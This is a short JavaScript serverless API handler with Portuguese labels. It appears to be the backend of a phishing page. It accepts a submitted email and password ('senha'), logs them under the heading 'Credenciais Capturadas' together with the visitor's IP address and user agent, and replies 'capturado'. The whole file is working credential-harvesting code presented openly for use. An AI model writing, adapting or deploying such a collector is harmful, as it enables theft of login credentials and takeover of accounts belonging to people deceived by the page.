export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ message: 'Method not allowed' });
  }

  const { email, senha } = req.body;

  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const ua = req.headers['user-agent'];

  console.log('----------------------------------');
  console.log('📥 Credenciais Capturadas');
  console.log(`📧 Email: ${email}`);
  console.log(`🔑 Senha: ${senha}`);
  console.log(`🌐 IP: ${ip}`);
  console.log(`📱 User-Agent: ${ua}`);
  console.log('----------------------------------');

  return res.status(200).json({ status: 'capturado' });
}
